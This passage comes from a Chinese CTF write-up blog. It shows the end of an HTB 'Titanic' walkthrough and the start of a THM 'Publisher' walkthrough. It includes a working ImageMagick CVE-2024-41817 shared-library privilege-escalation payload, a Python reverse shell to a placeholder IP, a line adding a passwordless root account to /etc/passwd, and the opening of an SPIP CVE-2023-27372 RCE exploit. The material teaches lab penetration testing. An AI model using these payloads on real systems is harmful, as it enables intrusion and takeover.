cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/601fbb69c73422e8.png"></p><p>developer 密码就是 <code>25282528</code>，ssh 登录拿到 userflag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">8</span>fd2b6d8b3295ff48e360a3b4ee855ed<br></code></pre></td></tr></table></figure><h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><p>查看一下进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:~$ <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br><span class="hljs-function"><span class="hljs-title">USER</span>         <span class="hljs-title">PID</span> %<span class="hljs-title">CPU</span> %<span class="hljs-title">MEM</span>    <span class="hljs-title">VSZ</span>   <span class="hljs-title">RSS</span> <span class="hljs-title">TTY</span>      <span class="hljs-title">STAT</span> <span class="hljs-title">START</span>   <span class="hljs-title">TIME</span> <span class="hljs-title">COMMAND</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    1174 24.5  0.9 1065140 36656 ?       <span class="hljs-title">Ssl</span>  11:27  14:40 /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">python3</span> /<span class="hljs-title">opt</span>/<span class="hljs-title">app</span>/<span class="hljs-title">app.py</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    2553  5.1  4.7 1542860 187236 ?      <span class="hljs-title">Ssl</span>  11:27   3:03 /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gitea</span> <span class="hljs-title">web</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97125  0.0  0.2  17072  9888 ?        <span class="hljs-title">Ss</span>   11:32   0:00 /<span class="hljs-title">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span> --<span class="hljs-title">user</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97635  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/0    <span class="hljs-title">Ss</span>+  11:32   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  391153  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/1    <span class="hljs-title">Ss</span>+  11:58   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  489859  0.0  0.1   8656  5412 <span class="hljs-title">pts</span>/2    <span class="hljs-title">Ss</span>+  12:09   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  513995  0.0  0.1   8656  5440 <span class="hljs-title">pts</span>/3    <span class="hljs-title">Ss</span>   12:11   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  578623  0.0  0.1   8788  5536 <span class="hljs-title">pts</span>/5    <span class="hljs-title">Ss</span>+  12:17   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  674578  0.0  0.0  10072  1548 <span class="hljs-title">pts</span>/3    <span class="hljs-title">R</span>+   12:26   0:00 <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br></code></pre></td></tr></table></figure><p>可以看到 <code>/opt/app/app.py</code>  消耗了大量 CPU 资源，在 <code>/opt/scripts</code> 下找到了 <code>identify_images.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /opt/app/static/assets/images<br><span class="hljs-built_in">truncate</span> -s 0 metadata.log<br>find /opt/app/static/assets/images/ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jpg&quot;</span> | xargs /usr/bin/magick identify &gt;&gt; metadata.log<br></code></pre></td></tr></table></figure><p>查看了一下日志文件，emmm没啥东西</p><p><img src="https://img.dkdun.cn/v1/2025/12/87487133510886ea.png"></p><p>搜了一下  <code>/usr/bin</code> 下的 <code>magick identify</code>，它是 <code>ImageMagic</code> 的命令行工具，&#96;&#96;ImageMagic&#96; 是一个用于查看、编辑位图文件以及进行图像格式转换的软件</p><p><img src="https://img.dkdun.cn/v1/2025/12/f43e4168641fd65e.png"></p><p>查看版本号</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>$ <span class="hljs-title">magick</span> --<span class="hljs-title">version</span></span><br><span class="hljs-function"><span class="hljs-title">Version</span>: <span class="hljs-title">ImageMagick</span> 7.1.1-35 <span class="hljs-title">Q16</span>-<span class="hljs-title">HDRI</span> <span class="hljs-title">x86_64</span> 1<span class="hljs-title">bfce2a62</span>:20240713 <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span></span><br><span class="hljs-function"><span class="hljs-title">Copyright</span>: (<span class="hljs-title">C</span>) 1999 <span class="hljs-title">ImageMagick</span> <span class="hljs-title">Studio</span> <span class="hljs-title">LLC</span></span><br><span class="hljs-function"><span class="hljs-title">License</span>: <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span>/<span class="hljs-title">script</span>/<span class="hljs-title">license.php</span></span><br><span class="hljs-function"><span class="hljs-title">Features</span>: <span class="hljs-title">Cipher</span> <span class="hljs-title">DPC</span> <span class="hljs-title">HDRI</span> <span class="hljs-title">OpenMP</span>(4.5)</span><br><span class="hljs-function"><span class="hljs-title">Delegates</span> (<span class="hljs-title">built</span>-<span class="hljs-title">in</span>): <span class="hljs-title">bzlib</span> <span class="hljs-title">djvu</span> <span class="hljs-title">fontconfig</span> <span class="hljs-title">freetype</span> <span class="hljs-title">heic</span> <span class="hljs-title">jbig</span> <span class="hljs-title">jng</span> <span class="hljs-title">jp2</span> <span class="hljs-title">jpeg</span> <span class="hljs-title">lcms</span> <span class="hljs-title">lqr</span> <span class="hljs-title">lzma</span> <span class="hljs-title">openexr</span> <span class="hljs-title">png</span> <span class="hljs-title">raqm</span> <span class="hljs-title">tiff</span> <span class="hljs-title">webp</span> <span class="hljs-title">x</span> <span class="hljs-title">xml</span> <span class="hljs-title">zlib</span></span><br><span class="hljs-function"><span class="hljs-title">Compiler</span>: <span class="hljs-title">gcc</span> (9.4)</span><br></code></pre></td></tr></table></figure><p>查 CVE ，找到了 <a href="https://www.cve.org/CVERecord?id=CVE-2024-41817">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7df3d39d6eeb0364.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fd79ef6d97f2c20f.png"></p><p><code>AppImage</code> 版本 <code>ImageMagick</code> 在执行过程中设置 <code>MAGICK_CONFIGURE_PATH</code> 和 <code>LD_LIBRARY_PATH</code> 环境变量时可能会使用空路径，这可能会在执行 <code>ImageMagick</code> 时通过在当前工作目录中加载恶意配置文件或共享库导致任意代码执行，具体在 <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/05a892579621b41d.png"></p><p>在工作目录创建共享库，工作目录应该是 <code>/opt/app/static/assets/images/</code></p><p>总结：在  <code>shell</code> 文件中找到了工作目录，又因为在工作目录下会有任意代码执行的漏洞，所以我们可以直接通过在 poc 里面写入命令拿到 root</p><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>将 <code>root/root.txt</code> 复制到当前目录来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;cp /root/root.txt root.txt;chmod 777 root.txt&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4a4a8a5dd790330a.png"></p><p>拿到 rootflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">24981e432</span>ecf<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">66462</span>da<span class="hljs-number">1</span>fa<span class="hljs-number">91</span>fff<span class="hljs-number">48</span>f<br></code></pre></td></tr></table></figure><h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>（这里是 SWDD 师傅的教学）可以发现 Machine 上有 python3，那么可以利用 poc 写反弹 shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;IP\&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&#x27;&quot;</span>);<br>    <span class="hljs-comment">//exit(0);</span><br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6eaeb6dc89725367.png"></p><p>拿到 root</p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>n0o0b 师傅教的一种方法（偷师学艺），直接添加一个新的免密登录的 root 账户进去</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &#x27;butt3rf1y::<span class="hljs-number">0</span>:<span class="hljs-number">0</span>::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/790be3ca4fe85fb1.png"></p><p>启动服务之后都得等一会儿才有回显</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>后面还通过 <code>crontab -l</code> 可以发现执行了定时任务 <code>identify_images.sh</code> 、<code>cleanup.sh</code>、<code>revert.sh</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/a3f4753dd40765a0.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat revert.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/tickets/*.json<br>/usr/bin/cp -a -r /root/images /opt/app/static/assets/<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat cleanup.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/static/assets/images/libxcb.so.1<br></code></pre></td></tr></table></figure><p>一个更新 <code>/opt/app/static/assets/</code> 目录下的 <code>images/</code> 目录，一个删除 <code>/opt/app/static/assets/images/</code> 目录下的 <code>libxcb.so.1</code> 文件</p><h1 id="CVE-2024-41817"><a href="#CVE-2024-41817" class="headerlink" title="CVE-2024-41817"></a>CVE-2024-41817</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;id&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p>来分析一下这个 poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br></code></pre></td></tr></table></figure><p>通过 <code>-shared</code> 创建一个共享库，共享库名字就是 <code>./libxcb.so.1</code>，至于为什么是 <code>libxcb</code>，我觉得应该是跟 ImageMagick 功能有关，<code>libxcb</code> 是 Linux下的一个开源的面向 C 语言的图形库，它专为 X Window 窗口系统开发，它提供了用于访问 X Window 的原生 API，使得 Linux 开发者可以准确地访问 X Window 系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__attribute__((constructor))<br></code></pre></td></tr></table></figure><p>这是 GCC 特有的扩展，指定了 <code>init()</code> 函数在 <code>main()</code> 函数之前运行，也就是说直接先执行 <code>init()</code> 函数内容即这里的 <code>system(&quot;id&quot;)</code> ，所以这里可以执行恶意代码。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Publisher&amp;The Sticker Shop</title>
    <link href="/2025/02/14/Shop/"/>
    <url>/2025/02/14/Shop/</url>
    
    <content type="html"><![CDATA[<p>学到了学到了，一点不熟悉的提权。我好菜我好菜我好菜，靶机时间都过了重开了好几次，整理完（顺带水了个简单的）已经天亮了: (</p><span id="more"></span><h1 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The “<strong>Publisher</strong>“ CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system’s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>开放了 22 和 80</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问 <code>http</code> 服务</p><p><img src="https://img.dkdun.cn/v1/2025/12/4cc51155fb8d9ac0.png"></p><p>扫目录扫到了很多 <code>spip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ffcdc112e84e4fcf.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fcf7bc6c74374df0.png"></p><p>搜了一下 <code>SPIP</code> ，是一个 CMS</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>用 msf 查找一下有没有什么漏洞</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">msfconsole</span> <span class="hljs-string">-q</span><br><span class="hljs-string">msf6</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">search</span> <span class="hljs-string">spip</span><br><br><span class="hljs-string">Matching</span> <span class="hljs-string">Modules</span><br><span class="hljs-string">================</span><br><br>   <span class="hljs-comment">#   Name                                             Disclosure Date  Rank       Check  Description</span><br>   <span class="hljs-bullet">-</span>   <span class="hljs-string">----</span>                                             <span class="hljs-string">---------------</span>  <span class="hljs-string">----</span>       <span class="hljs-string">-----</span>  <span class="hljs-string">-----------</span><br>   <span class="hljs-number">0</span>   <span class="hljs-string">exploit/multi/http/spip_bigup_unauth_rce</span>         <span class="hljs-number">2024-09-06       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">BigUp</span> <span class="hljs-string">Plugin</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span><br>   <span class="hljs-number">1</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">2</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">3</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">4</span>   <span class="hljs-string">exploit/multi/http/spip_porte_plume_previsu_rce</span>  <span class="hljs-number">2024-08-16       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span> <span class="hljs-string">via</span> <span class="hljs-string">porte_plume</span> <span class="hljs-string">Plugin</span><br>   <span class="hljs-number">5</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">6</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">7</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">8</span>   <span class="hljs-string">exploit/multi/http/spip_connect_exec</span>             <span class="hljs-number">2012-07-04       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">connect</span> <span class="hljs-string">Parameter</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">9</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">10</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">11</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">12</span>  <span class="hljs-string">exploit/multi/http/spip_rce_form</span>                 <span class="hljs-number">2023-02-27       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">form</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">13</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">14</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">15</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br><br><br><span class="hljs-string">Interact</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">by</span> <span class="hljs-string">name</span> <span class="hljs-string">or</span> <span class="hljs-string">index.</span> <span class="hljs-string">For</span> <span class="hljs-string">example</span> <span class="hljs-string">info</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-string">use</span> <span class="hljs-number">15</span> <span class="hljs-string">or</span> <span class="hljs-string">use</span> <span class="hljs-string">exploit/multi/http/spip_rce_form</span><br><span class="hljs-string">After</span> <span class="hljs-string">interacting</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">you</span> <span class="hljs-string">can</span> <span class="hljs-string">manually</span> <span class="hljs-string">set</span> <span class="hljs-string">a</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">with</span> <span class="hljs-string">set</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">&#x27;Windows Command Shell&#x27;</span><br></code></pre></td></tr></table></figure><p>结合题目描述来看可能是这个 rce</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">12 </span> exploit/multi/http/spip_rce_form                 <span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>       excellent  Yes    SPIP form PHP Injection<br></code></pre></td></tr></table></figure><h2 id="CVE-2023-27372"><a href="#CVE-2023-27372" class="headerlink" title="CVE-2023-27372"></a>CVE-2023-27372</h2><p>搜了一下，应该是打 <code>CVE-2023-27372</code>，创建一个 <code>27372.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># Exploit Title: SPIP &lt; 4.2.1 - Remote Code Execution (Unauthenticated)</span><br><span class="hljs-comment"># Google Dork: inurl:&quot;/spip.php?page=login&quot;</span><br><span class="hljs-comment"># Date: 19/06/2023</span><br><span class="hljs-comment"># Exploit Author: nuts7</span><br><span class="hljs-comment"># Vendor Homepage: https://www.spip.net/</span><br><span class="hljs-comment"># Software Link: https://files.spip.net/spip/archives/</span><br><span class="hljs-comment"># Version: &lt; 4.2.1 (Except few fixed versions indicated in the description)</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0</span><br><span class="hljs-comment"># CVE reference : CVE-2023-27372 (coiffeur)</span><br><span class="hljs-comment"># CVSS : 9.8 (Critical)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Vulnerability Description:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 